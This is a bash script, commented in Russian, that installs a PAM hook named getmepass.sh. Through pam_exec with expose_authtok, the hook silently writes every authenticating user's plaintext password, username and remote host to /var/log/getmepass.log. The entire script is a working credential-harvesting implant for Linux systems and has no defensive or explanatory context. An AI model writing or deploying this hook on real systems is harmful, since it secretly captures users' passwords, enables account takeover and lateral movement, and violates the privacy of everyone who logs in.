#!/bin/bash

# Создание файла скрипта /usr/local/bin/getmepass.sh
cat << 'EOF' > /usr/local/bin/getmepass.sh
#!/bin/sh
echo "$(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/getmepass.log
EOF

# Выставление прав на выполнение для файла скрипта
chmod 700 /usr/local/bin/getmepass.sh

# Добавление строки в конец файла /etc/pam.d/common-auth
echo 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/getmepass.sh' >> /etc/pam.d/common-auth

# Создание лог файла и выставление прав на него
touch /var/log/getmepass.log
chmod 770 /var/log/getmepass.log
